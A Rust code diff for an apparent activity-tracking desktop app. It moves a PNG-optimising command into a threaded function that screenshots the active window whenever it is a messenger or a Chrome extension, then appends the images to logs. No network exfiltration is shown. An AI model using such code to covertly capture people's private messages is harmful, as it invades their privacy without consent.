@@ -55,12 +55,6 @@ fn main() {
     log_machine_status("end");
     log_machine_status("start");
 
-    if run_cmd! {
-        oxipng -o 4 D:/_documents/temp.png -s;
-    }.is_err() {
-        println!("failed to optimize")
-    }
-
     let (s, r) = std::sync::mpsc::channel::<Events>();
     let icon = include_bytes!("./resources/appicon_128x128.ico");
 
@@ -265,29 +259,37 @@ fn track(event: Event) {
 }
 
 fn capture_screen(active_window: ActiveWindow) {
-    let is_extensions = active_window.title == "" && active_window.app_name == "Google Chrome";
-    if is_messengers(active_window.title) || is_extensions {
-        let screens = Screen::all().unwrap();
+    std::thread::spawn(|| {
+        let is_extensions = active_window.title == "" && active_window.app_name == "Google Chrome";
+        if is_messengers(active_window.title) || is_extensions {
+            let screens = Screen::all().unwrap();
 
-        for screen in screens {
-            // let image = screen.capture().unwrap();
-            let image = screen.capture_area(
-                active_window.position.x as i32,
-                active_window.position.y as i32,
-                active_window.position.width as u32,
-                active_window.position.height as u32
-            ).unwrap();
-            let temp = format!("{}temp.png", String::from_utf8_lossy(DOCUMENTS));
-            image
-                .save(temp)
-                .unwrap();
+            for screen in screens {
+                // let image = screen.capture().unwrap();
+                let image = screen.capture_area(
+                    active_window.position.x as i32,
+                    active_window.position.y as i32,
+                    active_window.position.width as u32,
+                    active_window.position.height as u32
+                ).unwrap();
+                let temp = format!("{}temp.png", String::from_utf8_lossy(DOCUMENTS));
+                image
+                    .save(temp)
+                    .unwrap();
 
-            match append_screenshots() {
-                Ok(_) => println!("Screenshots written to logs."),
-                Err(e) => println!("Error: {e:?}"),
-            };
+                if run_cmd! {
+                    oxipng -o 4 D:/_documents/temp.png -s;
+                }.is_err() {
+                    println!("failed to optimize screenshots.")
+                }
+
+                match append_screenshots() {
+                    Ok(_) => println!("Screenshots written to logs."),
+                    Err(e) => println!("Error: {e:?}"),
+                };
+            }
         }
-    }
+    });
 }
 
 fn log_machine_status(status: &str) {
